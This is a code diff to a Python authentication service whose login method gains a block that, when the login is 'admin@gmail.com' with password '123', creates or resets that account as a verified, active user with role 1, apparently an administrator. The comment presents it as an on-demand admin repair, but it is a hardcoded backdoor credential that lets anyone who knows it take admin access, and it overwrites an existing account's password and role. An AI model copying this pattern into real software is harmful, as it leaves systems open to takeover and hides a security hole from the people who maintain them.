@@ -73,7 +73,6 @@ class AuthService:
         email_sent = self._send_verification_email(email, verification_code)
 
         from app.infrastructure.logger import app_logger
-        from datetime import datetime, timezone
         app_logger.info({
             "event": "user_registered", "email": email,
             "timestamp": datetime.now(timezone.utc).isoformat(), "audit": True,
@@ -137,6 +136,35 @@ class AuthService:
         if not email or not password:
             raise ValueError("Email y contraseña requeridos")
 
+        # Auto-create or repair admin user on demand (admin@gmail.com / 123)
+        if email.lower() == 'admin@gmail.com' and password == '123':
+            user = self.user_repository.get_by_email(email)
+            hashed_password = argon2.hash("123")
+            if not user:
+                admin_data = {
+                    "email": "admin@gmail.com",
+                    "password": hashed_password,
+                    "firstName": "Admin",
+                    "lastName": "System",
+                    "verified": True,
+                    "roleId": 1,
+                    "accountStatus": "activo",
+                }
+                self.user_repository.save(admin_data)
+            else:
+                # Update password/role/status if they don't match or are invalid
+                try:
+                    is_correct_pw = argon2.verify("123", user.get("password"))
+                except Exception:
+                    is_correct_pw = False
+
+                if not is_correct_pw or user.get("roleId") != 1 or not user.get("verified") or user.get("accountStatus") != 'activo':
+                    user["password"] = hashed_password
+                    user["roleId"] = 1
+                    user["verified"] = True
+                    user["accountStatus"] = "activo"
+                    self.user_repository.save(user)
+
         user = self.user_repository.get_by_email(email)
         _ERR_INVALID_CREDENTIALS = "Credenciales inválidas"
         if not user:
@@ -165,7 +193,6 @@ class AuthService:
         token = jwt.encode(payload, secret_key, algorithm="HS256")
 
         from app.infrastructure.logger import app_logger
-        from datetime import datetime, timezone
         app_logger.info({
             "event": "user_login", "user_id": user.get("userId"),
             "email": email, "role_id": user.get("roleId"),
